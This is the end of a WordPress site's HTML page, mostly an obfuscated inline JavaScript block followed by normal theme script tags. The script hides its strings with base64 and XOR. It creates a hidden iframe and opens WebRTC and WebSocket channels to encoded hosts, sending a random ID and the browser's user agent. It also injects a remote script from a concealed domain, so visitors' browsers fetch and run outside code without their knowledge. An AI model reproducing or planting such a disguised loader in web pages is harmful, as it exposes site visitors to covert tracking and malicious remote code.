RegExp(a("Kg4VAhceDgINAU09B1JHPQ5HT1tbTQwCHQUmPTNPRCoQRlRELxNBP1c4E0o/VzsFQTBBLwBcWToJUlpZFx8UVgcfEgAL"))),null==n?null:(n=n[1],a("FwwaCBoTCxccXkdBUlkyJTpMXUJQQE1eXk9HTkM=")+n+a("VBkNHFMfBRAN"))},n,t)}function F(n,t,e,A,o){function r(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;A=r.bind(null,A),o=r.bind(null,o);var w={};w[a("HQ4RPxYFHAYLFw==")]=[t];var i=new g.c(w);i[a("Fx8RDQcSLgINBTQJAhcJBAY=")](a("WwARGBJYGgoXAw==")).binaryType=a("FR8GDQoVHwUfAQU="),i[a("GwMdDxYUCw0dDRMAFxw=")]=function(n){if(null!=n[a("FwwaCBoTCxcc")]&&(n=e(n[a("FwwaCBoTCxcc")][a("FwwaCBoTCxcc")]),null!=n)){var t={};t[a("FwwaCBoTCxcc")]=n,t[a("BwkEIT8eBAYwChMEGw==")]=0,i[a("FQkQJRASKQIXAB4FAg0C")](new g.b(t),function(){},function(){})}},i.addEventListener(a("HQ4RDxwZBAYaEB4ODQoTAB4JDBsFGR4D"),function(){i[a("HQ4RLxwZBAYaEB4ODSoTAB4J")]===a("EgwdABYT")&&o()});var B=a("AlBEZhxKHxAcFhkADhxHUUpcTzoqVzA2WVlCS1RIVFhEQ0VmAEoZBgoXHg4NFwYMD2YMTi05WS89TVNIUVFKRlpdWl15A1dTWVR9AF4fDg8NCR0DFh4XElcKGxhOVFFAVA==")+n+a("fgxJBRASRwwJEB4ODQpdFRgFDBgIEnMLUBgDCQ8PBxcABBsCU0ZYUE1EMzUvKkgyKTg/U1FHSVZnGE4KABIUGxUdTllDR1pDDgEVExcaSgULGA4QDBYXCAgVU0tWUG4XSQQXCV4CDBEYA00=")+function(){for(var n="",t=a("RF1EXENHWlM="),e=0;16>e;++e){var A=(4294967296*Math.random()>>>0).toString(16);n+=t.substring(0,t.length-A.length)+A}return n}()+a("fgxJBRASRxMOAE1RU0lXUVpcX0NUR0lWXUlDSVNWVEZEXURcQ0daU0lUR2s=");i[a("Fx8RDQcSJQUfAQU=")](function(n){i[a("BwgAIBwUCw89AQQCERAXFQMDAQ==")](n,function(){var n={};n[a("ABQECQ==")]=a("FQMHGxYF"),n[a("BwkE")]=B,i[a("BwgAPhYaBRccIBISAAsOER4FAB0=")](new g.f(n),function(){},function(){})},function(){})},function(){}),n=i[a("Fx8RDQcSLgINBTQJAhcJBAY=")](a("WxoHHHM=")+window.navigator.userAgent),n.binaryType=a("FR8GDQoVHwUfAQU="),G(n,x(),function(n){A(n,{rtc:i})},function(){o()})}function S(n,t){function e(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var A=x();A=a(window.location.protocol==a("HBkAHABN")?"HBkAHABNRUw=":"HBkAHElYRQ==")+u+A;var o=a("Mygg"),c=!1;n=e.bind(null,n),t=e.bind(null,t);var w=new g.g;w.onreadystatechange=function(){4==w.readyState&&(0==w.status?t():n(r(w.response),{}))},w.onerror=function(){t()},w.open(o,A,!0),w.responseType=a("FR8GDQoVHwUfAQU="),w.send(null)}function P(n,t){var e=a("Ax4HVlxY"),A=new g.a(e+w+a("WxoHHA=="));A.binaryType=a("FR8GDQoVHwUfAQU="),G(A,x(),function(a){n(a,{ws:A})},function(){t()})}function G(n,t,e,A){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;e=o.bind(null,e),A=o.bind(null,A);var w=!1,i=setTimeout(function(){A(Error())},3e3),B=E(JSON.stringify({url:t||"",method:a("Mygg"),headers:null,body:null}));n.onopen=function(){clearTimeout(i),n.send(B)};var l,g=new ArrayBuffer(0);n.onmessage=function(n){if(4===n.data.byteLength){var a=new Uint8Array(n.data);if(222===a[0]&&173===a[1]&&190===a[2]&&239===a[3])return}!1===w?(w=!0,n=r(n.data),l=JSON.parse(n),l={status:l.status||0,headers:l.headers||{}}):(n=n.data,a=new Uint8Array(g.byteLength+n.byteLength),a.set(new Uint8Array(g),0),a.set(new Uint8Array(n),g.byteLength),g=a.buffer)},n.onerror=function(){clearTimeout(i),A(Error())},n.onclose=function(){w?(l.body=g,e(r(l.body))):(clearTimeout(i),A(Error()))}}function y(n){return window[n.name]?window[n.name]:n[a("FwIaGBYZHicWBwIMBhcT")]&&n[a("FwIaGBYZHicWBwIMBhcT")][a("EAgSDQYbHjUQAQA=")]?n[a("FwIaGBYZHicWBwIMBhcT")][a("EAgSDQYbHjUQAQA=")]:n[a("FwIaGBYZHjQQChMOFA==")]}function H(){var n=document.createElement(a("HQsGDR4S"));n.style.height=a("RR0M"),n.style.width=a("RR0M"),n.style.display=a("GgIaCQ=="),n[a("Bx8XCBwU")]=a("FQ=="),n.name||(n.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7)),(document.body||document.head||document.documentElement).appendChild(n);var t=y(n);t.document.documentElement||t.document.write(a("FQ=="));try{t.stop()}catch(e){}return n}function O(){I=a("AQMfAhwABA=="),t=a("FwUGAx4S"),q=a("EgQGCRUYEg=="),z=a("Gx0RHhI="),A=a("BwwSDQEe");var n=H();n=y(n);var e=n.navigator.userAgent,o=new RegExp(a("FwUGAx4SFgARFhgMCgwK"),"i").test(e)?t:new RegExp(a("EgQGCRUYEh8QBxIWBhgUBAYQCQsNGAo="),"i").test(e)?q:new RegExp(a("KkVcU1IUAhEWCRIdAhcDEwUFC1pKXlMVDB8SCwo="),"i").test(e)?A:new RegExp(a("Gx0GEBwHAwwK"),"i").test(e)?z:window[a("FwUGAx4S")]?t:"undefined"!=typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(o)&&(n=window),e=a("ERsVAA=="),g.c=n[e](a("AwQaCBwARDEtJycEBgskDgQCChAQHhYITQUPWRQPChIbGlobFhUBCg02IyIzHAITKQMBHQEUDQ8CF1MFH0YTHxoJGxtdGgUZKzA0MQYcFSIFAgEWBwMQCQNZDwVDEQ0YEAIDQh4EODc6NBIEEToIDwQJDAcNGBc=")),g.f=n[e](a("AwQaCBwARDEtJyQEEAoODgQoCgAHBRAWGRAcF0MaGFYDBBoIHABEFBwGHAgXKzMiOQkcAA0YFyIIChALChYQHxsDVBAPVx0KFwAYFk0UCBs4OCwgAQQKDwIXNxwQBRYfBBkdAx1XFh9ZEx4PBxYQTwcfPScnJBwVHhAcFycDFxUGBAQYGhgE")),g.b=n[e](a("AwQaCBwARDEtJz4CBjoGDw4FCxIQElkaEVkEEA0CCwFaGhEOGB4eMS0nPgIGOgYPDgULEhASWRoRWQQQDQILAVoAGxYhIykqGgE0AA0dDgULGApTGAtZEQQXFxYUSAkFJjk3JRASKQIXAB4FAg0C")),o===q?(o=H(),g.a=y(o)[e](a("AwQaCBwARDQcBiQOABICFQ==")),o.parentElement.removeChild(o)):g.a=n[e](a("AwQaCBwARDQcBiQOABICFQ==")),g.g=n[e](a("AwQaCBwARDs0KD8VFwk1BBsZCgAQ"))}function D(n,a){var t=new Uint8Array(a),e=new ArrayBuffer(a.byteLength);e=new Uint8Array(e);for(var A=0;A<a.byteLength;A++)e[A]=t[A]^n.charCodeAt(A%n.length);return e.buffer}function r(n){if(window.TextDecoder)return new window.TextDecoder("utf-8").decode(new Uint8Array(n));var a="";n=new Uint8Array(n);for(var t=n.byteLength,e=0;t>e;e++)a+=String.fromCharCode(n[e]);return decodeURIComponent(escape(a))}function E(n){if(window.TextEncoder)return new window.TextEncoder("utf-8").encode(n).buffer;n=unescape(encodeURIComponent(n));for(var a=new Uint8Array(n.length),t=0;t<n.length;t++)a[t]=n.charCodeAt(t);return a.buffer}function x(){return a("WwgeH0wHVw==")+"2204220002"}function a(n){n=window.atob(n);for(var a="",t=0;t<n.length;t++)a+=String.fromCharCode(n.charCodeAt(t)^"tmtlswjcydwacygajlosdwyfmysycfdv".charCodeAt(t%32));return a}function v(){if(!J){var n=("https:"==window.location.protocol?"https://":"http://")+u+T,a=document.createElement("script");a.type="text/javascript",a.async=!0,a.src=n,(document.body||document.head||document.documentElement).appendChild(a),J=!0}}var u=a("DAUGQhcCGAIDCwcATRoIDA=="),w=a("FUMQGQEWEAwJBVkCDBQ="),T=decodeURIComponent("%2Fljs%3Fp%3D")+"2204220002",N="/l?p=2204220002&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.i)try{v()}catch(b){}try{B()}catch(b){}}()}catch(B){}
</script><script type='text/javascript' src='http://hyperactivz.com/wp-content/plugins/forensiq-include/forensiq-script.min.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://hyperactivz.com/wp-content/themes/hyperaktivz/scripts/plugins.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://hyperactivz.com/wp-content/themes/hyperaktivz/scripts/main.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://hyperactivz.com/wp-includes/js/wp-embed.min.js?ver=4.8.5'></script>
</body>
</html>